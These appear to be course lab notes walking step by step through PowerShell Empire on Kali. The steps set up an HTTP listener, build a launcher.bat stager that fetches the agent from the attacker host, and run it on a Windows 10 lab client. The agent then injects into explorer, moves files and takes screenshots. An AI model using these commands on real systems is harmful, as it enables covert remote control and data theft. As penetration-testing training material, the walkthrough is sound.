

# 23.1.3.1.1. Install and start PowerShell Empire on your Kali system.

Search for powershell-empire in the Kali repositories, and install with apt.
`sudo apt-cache search powershell-empire`
`sudo apt install powershell-empire`
![3f14820acabbe218fb3d4f98c399a62a.png](f9a6d72865264749924278bdbcf6285e.png)

Run powershell-empire
`sudo powershell-empire`
![bd9872fd4e89f857e93b8150fde6cab8.png](2a755a8a498d421eb23102f02711de8c.png)
![cbf2a7c838a7653d1ac1106b16bceedc.png](d2004780f69e495083d26bb1e1e3d458.png)



# 23.1.3.1.2. Create a PowerShell Empire listener on your Kali machine and execute a stager on your Windows 10 client.

### Prepare the PowerShell Empire listener
List the current listeners, then use the http listener and find more info about it.
`listeners`
`uselistener http` **You must press [TAB] to get the list**
`info`
![43d34d6488640eab70455fc885d8bb0c.png](d641ff7289a44064becad9712de3d017.png)

Set the host machine as Kali IP address, and port 80, then verify the changes. **If you want to use port 80, ensure you use sudo and stop the apache server!**
`set Host 192.168.119.214`
`set Port 80`
![46051784a7c889b37a8716299a717d17.png](909035755f7e4a9aacbbab12f930f0c9.png)

Start the listener with the execute command
`execute`
![d9ff4148692b30708d2b42d14267cd1f.png](12572275812e47d0aaa68b20943322b5.png)

### Prepare the Stager
Return to the main listener menu with back, then list all stagers, and choose the windows/launcher_bat
`back`
`usestager`
`usestager windows/launcher_bat` **You must press [TAB] to get the list**
`info`
![26d079bdda35f3bd5f02e537817eb9be.png](88183ff684ac466b8b8dfb489dce4d5b.png)

Configure the Listener parameter with the set command followed by the name of the listener we just created. Then, create the stager with execute.
`set Listener`
`execute`
![f49c8813a5d283a0854acc16d430cd5e.png](b07c0d83580648eb830961fbd76ce061.png)

Here is what the launcher.bat file looks like
`cat /tmp/launcher.bat`
![b8b3e2fbd00f4235c2cb33b816382a6e.png](aa7cda630930485db2ee6a09689625ac.png)

The stager is a base64-encoded PowerShell command string. This first-stage payload will connect to the listener and fetch the rest of the Empire agent code.

### Deploy and agent to the victim
An agent is the final payload retrieved by the stager, and it allows us to execute commands and interact with the system. The stager (in this case the .bat file) deletes itself and exists once it finishes execution.

Once the agent is operational on the target, it will set up an AES-encrypted communication channel with the listener using the data portion of the HTTP GET and POST requests.

First, copy the launcher.bat script to the Windows 10 workstation. Netcat was used for this example
![f810692dd568ddd16ded946aa9e4dbad.png](e0a7160cce7e49fda9b38447a7f7e52c.png)
![7f1b285f6e75aff24bb255d28096f26e.png](01482c12a7c344a78427b15da84a502a.png)

Execute the launcher.bat script on Windows 10 from the command prompt
`launcher.bat`

After running launcher.bat, we will see an initial agent call in the Empire session.
![da23d0b6b69d964a94681aac4f50f437.png](305011624ef14e058061934ac6861b66.png)

Display all active agents
`agents`
![89149ab783aaa55a4694ac3dd08b219b.png](3cba1af50cb34fcd8a5c94521402eefb.png)

Now, we can use the interact command followed by the agent name to interact with our agent and execute commands. Then use the sysinfo command to retrieve info about the compromised host (Windows 10 client)
`interact XTSVLA3R`
`sysinfo`
![ec047e5b1fa59315b03223dc309130cd.png](806f125f88854b51a22a059f885049c1.png)

We can view the available commands with the help command
`help`
![8c03fb0427d9345a1883f4b3be332fd9.png](af804e40138b4e2c95716f2211fe048d.png)

View all running processes. We will be choosing 'explorer', so make sure you have opened an explorer window on the Windows 10 client.
`ps`
![40972670246fb74c7dd2577a5be14e01.png](ba9bdd0d7c32417ba884dabe5a3dae36.png)
![d86c9258a1ffe4f6076ed5161604abc4.png](4a2ffa1d0de545b0a2fd3327797cac1b.png)

Choose the 'explorer' process as our target process, and migrate the payload to it with the psinject command, including the name of the listener and the process id as our command arguments
`psinject http 4600`
![f0778b08f783b627deaf4f9d8c6bbcff.png](6d1e34550da64235b8e1c3b699f7f3ac.png)

It is important to note that, unlike the migration feature of the meterpreter payload, once the process migration is completed, the original Empire agent remains active and we must manually switch to the newly created agent as shown below:
`agents`
`interact MKVFZN51`
![e32fba342e377f3c28a67c932b6abb11.png](4aab10dd7fba4572803c7a6283c65fdc.png)


# 23.1.3.1.3. Experiment with the PowerShell Empire agent and its basic functionality.

`ipconfig`
`tasklist`
![e9afc0eae439f8da576eb37e58628050.png](e2623988a2be4d199985d228b2227594.png)

`pwd`
`cd ../`
`cd Desktop`
![c3c45f29840c1bf07ede3efa8fc68a68.png](7c5203b8cb504bafbbef907b8dd06181.png)

`download fromWin10.txt`
`upload /tmp/fromKali.txt`
![8111ec39ffae6beba8830ac45667f0d8.png](45731da607a742239fc9122e63f9024c.png)

`usemodule collection/screenshot`
`info`
`execute`
![b51261bb050e95658a37c00d387f5ac3.png](e68015c40bca42eaaadb800e47b7047e.png)
